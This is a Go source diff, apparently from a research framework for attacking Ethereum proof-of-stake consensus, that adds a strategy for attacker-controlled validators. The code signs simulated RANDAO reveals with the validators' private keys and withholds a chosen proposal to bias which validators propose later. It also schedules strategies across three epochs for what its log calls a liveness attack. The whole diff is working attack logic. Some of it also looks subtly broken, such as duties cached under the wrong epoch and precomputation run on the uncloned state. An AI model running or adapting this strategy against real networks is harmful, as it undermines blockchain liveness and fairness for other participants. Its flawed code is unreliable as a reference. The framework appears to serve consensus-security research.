@@ -4,14 +4,18 @@ import (
 	"context"
 	"github.com/google/uuid"
 	"github.com/prysmaticlabs/prysm/v5/cache/lru"
+	"github.com/prysmaticlabs/prysm/v5/consensus-types/primitives"
 	log "github.com/sirupsen/logrus"
 	"github.com/tsinghua-cel/attacker-service/common"
+	"github.com/tsinghua-cel/attacker-service/disguisedRandao"
 	"github.com/tsinghua-cel/attacker-service/types"
 	"strconv"
 	"time"
 )
 
 type Instance struct {
+	b     types.ServiceBackend
+	param types.LibraryParams
 }
 
 func (o *Instance) Name() string {
@@ -36,6 +40,11 @@ func (o *Instance) Run(ctx context.Context, params types.LibraryParams, feedback
 	olog := log.WithField("name", o.Name())
 	olog.Info("start to run strategy")
 	attacker := params.Attacker
+	o.b = attacker.GetBackend()
+
+	t := time.NewTicker(time.Second)
+	defer t.Stop()
+
 	history := make(map[int]bool)
 	epochDutyCache := lru.New(10)
 	var getCacheDuty = func(epoch int64) (duties []types.ProposerDuty) {
@@ -48,78 +57,305 @@ func (o *Instance) Run(ctx context.Context, params types.LibraryParams, feedback
 	var setCacheDuty = func(epoch int64, duties []types.ProposerDuty) {
 		epochDutyCache.Add(epoch, duties)
 	}
-	curSlot := common.CurrentSlot()
-	colock := common.NewTimeClock()
-	defer colock.Stop()
-
-	listen := colock.AddListener()
-
-	var targetSlot = common.EpochStart(curSlot + 1)
-	colock.SetTarget(common.BeginsAt(targetSlot))
-
+	triggerring := false
+	triggeredEpoch := 0 // record the epoch that strategy is triggered.
 	for {
 		select {
 		case <-ctx.Done():
 			log.WithField("name", o.Name()).Info("stop to run strategy")
 			return
-		case <-listen:
+		case <-t.C:
+			// 如果当前epoch的第一个slot是attacker, 并且下一个epoch 的第一个slot是attacker,
+			// 那么当前epoch 为 epoch 1， 后续一共三个epoch.
+			// 当前epoch的第一个slot delay 8s.
 			epoch := common.CurrentEpoch()
-			nextEpoch := epoch + 1
-
-			// reset timer to next slot.
-			colock.ResetTarget(time.Second * time.Duration(common.GetChainBaseInfo().SecondsPerSlot))
-			if _, ok := history[int(nextEpoch)]; ok {
-				// already processed next epoch.
+			if history[int(epoch)] == true {
 				continue
 			}
+			nextEpoch := epoch + 1
 
-			var (
-				curDuty, nextDuty []types.ProposerDuty
-				err               error
-			)
-
-			// always get next epoch duty.
-			if nextDuty = getCacheDuty(nextEpoch); nextDuty == nil {
-				nextDuty, err = attacker.GetEpochDuties(nextEpoch)
-				// if failed, wait next loop.
-				if err != nil {
-					// get next epoch duty failed, continue for next loop.
+			var curDuty = getCacheDuty(epoch)
+			var nextDuty = getCacheDuty(nextEpoch)
+			if curDuty == nil {
+				if duty, err := attacker.GetEpochDuties(epoch); err != nil {
 					continue
-				}
-				setCacheDuty(nextEpoch, nextDuty)
-			}
-
-			history[int(nextEpoch)] = true
-			if !params.IsHackValidator(toInt(nextDuty[0].ValidatorIndex)) {
-				olog.WithFields(log.Fields{
-					"next epoch":      nextEpoch,
-					"first validator": nextDuty[0].ValidatorIndex,
-				}).Debug("strategy skip")
-
-			} else {
-				// set strategy for next epoch, and check if current epoch duty is hack validator.
-				strategy := types.Strategy{}
-				strategy.Uid = uuid.NewString()
-				strategy.Slots = GenSlotStrategy(nextDuty)
-				strategy.Category = o.Name()
-				if err = attacker.UpdateStrategy(strategy); err != nil {
-					log.WithField("error", err).Error("failed to update strategy")
 				} else {
-					olog.WithFields(log.Fields{
-						"epoch":    nextEpoch,
-						"strategy": strategy,
-					}).Info("update strategy successfully")
+					setCacheDuty(epoch, duty)
+					curDuty = duty
 				}
-				curDuty = getCacheDuty(epoch)
-				// then give a trigger log.
-				if curDuty != nil && params.IsHackValidator(toInt(curDuty[0].ValidatorIndex)) {
-					olog.WithFields(log.Fields{
-						"current epoch": epoch,
-						"next epoch":    nextEpoch,
-					}).Info("strategy trigger")
+			}
+			if nextDuty == nil {
+				if duty, err := attacker.GetEpochDuties(nextEpoch); err != nil {
+					continue
+				} else {
+					setCacheDuty(epoch, duty)
+					nextDuty = duty
 				}
 			}
 
+			var err error
+			for {
+				if !triggerring {
+					if params.IsHackValidator(toInt(nextDuty[0].ValidatorIndex)) && params.IsHackValidator(toInt(curDuty[0].ValidatorIndex)) {
+						triggerring = true
+						triggeredEpoch = int(epoch)
+						olog.WithFields(log.Fields{
+							"current epoch": epoch,
+							"next epoch":    epoch + 1,
+						}).Info("strategy trigger")
+						continue
+					}
+					// set strategy for next epoch.
+					strategy := types.Strategy{}
+					strategy.Uid = uuid.NewString()
+					strategy.Slots = generateSimpleStrategy(int(nextEpoch), params.FillterHackerDuties(nextDuty))
+					strategy.Category = o.Name()
+					if err = attacker.UpdateStrategy(strategy); err != nil {
+						log.WithField("error", err).Error("failed to update strategy")
+					} else {
+						olog.WithFields(log.Fields{
+							"epoch":    nextEpoch,
+							"strategy": strategy,
+							"trigger":  triggerring,
+						}).Info("update strategy successfully")
+						history[int(epoch)] = true
+					}
+
+					break
+
+				} else {
+					offset := epoch - int64(triggeredEpoch) + 1
+					if offset == 1 {
+						{
+							// update current epoch strategy.
+							strategy := types.Strategy{}
+							strategy.Uid = uuid.NewString()
+							strategy.Slots = genStrategyForTrigger1(int(epoch), params.FillterHackerDuties(curDuty))
+							strategy.Category = o.Name()
+							if err = attacker.UpdateStrategy(strategy); err != nil {
+								olog.WithField("error", err).Error("failed to update triggering strategy")
+							} else {
+								olog.WithFields(log.Fields{
+									"epoch":    nextEpoch,
+									"strategy": strategy,
+									"trigger":  triggerring,
+									"offset":   1,
+								}).Info("update triggering strategy successfully")
+							}
+						}
+						{
+							// generate next epoch strategy without bestMaskDuty.
+							strategy := types.Strategy{}
+							strategy.Uid = uuid.NewString()
+							strategy.Slots = genStrategyForTrigger2(int(nextEpoch), params.FillterHackerDuties(nextDuty), types.ProposerDuty{})
+							strategy.Category = o.Name()
+							if err = attacker.UpdateStrategy(strategy); err != nil {
+								olog.WithField("error", err).Error("failed to update triggering strategy")
+							} else {
+								olog.WithFields(log.Fields{
+									"epoch":    nextEpoch,
+									"strategy": strategy,
+									"trigger":  triggerring,
+									"offset":   2,
+								}).Info("pre update triggering strategy successfully")
+							}
+						}
+						history[int(epoch)] = true
+						break
+					} else if offset == 2 {
+						// compute bestMaskDuty and update current epoch strategy.
+						bestMask, err := o.ComputeBestMaskDuty(uint64(common.CurrentSlot()))
+						if err != nil {
+							olog.WithField("error", err).Error("failed to compute best mask duty")
+							break
+						}
+						{
+							// update current epoch strategy.
+							strategy := types.Strategy{}
+							strategy.Uid = uuid.NewString()
+							strategy.Slots = genStrategyForTrigger2(int(epoch), params.FillterHackerDuties(curDuty), *bestMask)
+							strategy.Category = o.Name()
+							if err = attacker.UpdateStrategy(strategy); err != nil {
+								olog.WithField("error", err).Error("failed to update triggering strategy")
+							} else {
+								olog.WithFields(log.Fields{
+									"epoch":    nextEpoch,
+									"strategy": strategy,
+									"trigger":  triggerring,
+									"offset":   2,
+								}).Info("update triggering strategy successfully")
+							}
+						}
+						{
+							// generate next epoch strategy without bestMaskDuty.
+							strategy := types.Strategy{}
+							strategy.Uid = uuid.NewString()
+							strategy.Slots = genStrategyForTrigger2(int(nextEpoch), params.FillterHackerDuties(nextDuty), types.ProposerDuty{})
+							strategy.Category = o.Name()
+							if err = attacker.UpdateStrategy(strategy); err != nil {
+								olog.WithField("error", err).Error("failed to update triggering strategy")
+							} else {
+								olog.WithFields(log.Fields{
+									"epoch":    nextEpoch,
+									"strategy": strategy,
+									"trigger":  triggerring,
+									"offset":   3,
+								}).Info("pre update triggering strategy successfully")
+							}
+						}
+						history[int(epoch)] = true
+						break
+					} else if offset == 3 {
+						// compute bestMaskDuty and update current epoch strategy.
+						bestMask, err := o.ComputeBestMaskDuty(uint64(common.CurrentSlot()))
+						if err != nil {
+							olog.WithField("error", err).Error("failed to compute best mask duty")
+							break
+						}
+						{
+							// update current epoch strategy.
+							strategy := types.Strategy{}
+							strategy.Uid = uuid.NewString()
+							strategy.Slots = genStrategyForTrigger3(int(epoch), params.FillterHackerDuties(curDuty), *bestMask)
+							strategy.Category = o.Name()
+							if err = attacker.UpdateStrategy(strategy); err != nil {
+								olog.WithField("error", err).Error("failed to update triggering strategy")
+							} else {
+								olog.WithFields(log.Fields{
+									"epoch":    nextEpoch,
+									"strategy": strategy,
+									"trigger":  triggerring,
+									"offset":   3,
+								}).Info("update triggering strategy successfully")
+							}
+						}
+						{
+							// set triggering to false
+							triggerring = false
+							// generate next epoch strategy.
+							strategy := types.Strategy{}
+							strategy.Uid = uuid.NewString()
+							strategy.Slots = generateSimpleStrategy(int(nextEpoch), params.FillterHackerDuties(nextDuty))
+							strategy.Category = o.Name()
+							if err = attacker.UpdateStrategy(strategy); err != nil {
+								olog.WithField("error", err).Error("failed to update triggering strategy")
+							} else {
+								olog.WithFields(log.Fields{
+									"epoch":    nextEpoch,
+									"strategy": strategy,
+									"trigger":  triggerring,
+								}).Info("update strategy successfully")
+							}
+						}
+						history[int(epoch)] = true
+						break
+					}
+				}
+			}
 		}
 	}
+}
+
+func (o *Instance) ComputeBestMaskDuty(slot uint64) (*types.ProposerDuty, error) {
+	strSlot := strconv.FormatUint(uint64(slot), 10)
+	currentState, err := o.b.GetBeaconState(strSlot)
+	if err != nil {
+		log.WithFields(log.Fields{
+			"slot": strSlot,
+			"err":  err,
+		}).Error("failed to get beacon state")
+		return nil, err
+	}
+	mostate, err := disguisedRandao.InitMoState(currentState)
+	if err != nil {
+		log.WithFields(log.Fields{
+			"slot": strSlot,
+			"err":  err,
+		}).Error("failed to init mo state")
+		return nil, err
+	}
+	currentEpoch := common.SlotToEpoch(int64(slot))
+	next2Epoch := currentEpoch + 2
+	currentDuty, err := o.b.GetProposeDuties(int(currentEpoch))
+	// append all attacker validators' duties.
+	allAttackerDuties := make([]types.ProposerDuty, 0)
+	for _, duty := range currentDuty {
+		if o.param.IsHackValidator(toInt(duty.ValidatorIndex)) {
+			allAttackerDuties = append(allAttackerDuties, duty)
+		}
+	}
+	var (
+		maxAttackerValidatorDuties = 0
+		bestMaskDuty               = types.ProposerDuty{}
+	)
+	for maskIdx := 1; maskIdx < len(allAttackerDuties); maskIdx++ {
+		// loop mask one attack validator to proposer block.
+		maskDuty := allAttackerDuties[maskIdx]
+
+		cState := mostate.Clone()
+
+		for i := 0; i < len(allAttackerDuties); i++ {
+			duty := allAttackerDuties[i]
+			// if current duty is earlier than current slot, skip it.
+			// if the duty is the masked one, skip it.
+			if toInt(duty.Slot) < int(slot) || i == maskIdx {
+				continue
+			}
+			// simulate validator generate a randao_reveal and update to state.
+			_, privk, err := o.b.GetValidatorsKeys(toInt(allAttackerDuties[i].ValidatorIndex))
+			if err != nil {
+				log.WithFields(log.Fields{
+					"validator index": allAttackerDuties[i].ValidatorIndex,
+				}).Error("failed to get validator keys when preparing strategy")
+				return nil, err
+			}
+
+			// generate a randao reveal.
+			randaoReveal, err := cState.GenerateRandaoReveal(privk, primitives.Epoch(currentEpoch))
+			if err != nil {
+				log.WithFields(log.Fields{
+					"validator index": allAttackerDuties[i].ValidatorIndex,
+					"err":             err,
+				}).Error("failed to generate randao reveal when preparing strategy")
+				return nil, err
+			}
+
+			if err = disguisedRandao.ProcessRandaoNoVerify(cState, randaoReveal, primitives.Epoch(currentEpoch)); err != nil {
+				log.WithFields(log.Fields{
+					"validator index": allAttackerDuties[i].ValidatorIndex,
+					"err":             err,
+				}).Error("failed to process randao reveal when preparing strategy")
+				return nil, err
+			}
+		}
+		// epoch process.
+		proposers, err := mostate.PrecomputeProposerIndices(disguisedRandao.GenValidatorIndices(o.param.MinValidatorIndex, o.param.MaxValidatorIndex),
+			primitives.Epoch(next2Epoch))
+		if err != nil {
+			log.WithFields(log.Fields{
+				"current":    currentEpoch,
+				"next2epoch": next2Epoch,
+				"err":        err,
+			}).Error("failed to precompute proposer indices")
+			return nil, err
+		}
+		if attackerCount := o.attackerCount(proposers); attackerCount > maxAttackerValidatorDuties {
+			maxAttackerValidatorDuties = attackerCount
+			bestMaskDuty = maskDuty
+		}
+	}
+	log.WithFields(log.Fields{
+		"maskDuty": bestMaskDuty,
+	}).Info("liveness attack strategy prepared")
+	return &bestMaskDuty, nil
+}
+
+func (o *Instance) attackerCount(vals []primitives.ValidatorIndex) int {
+	var count = 0
+	for i := 0; i < len(vals); i++ {
+		if o.param.IsHackValidator(int(vals[i])) {
+			count++
+		}
+	}
+	return count
 }
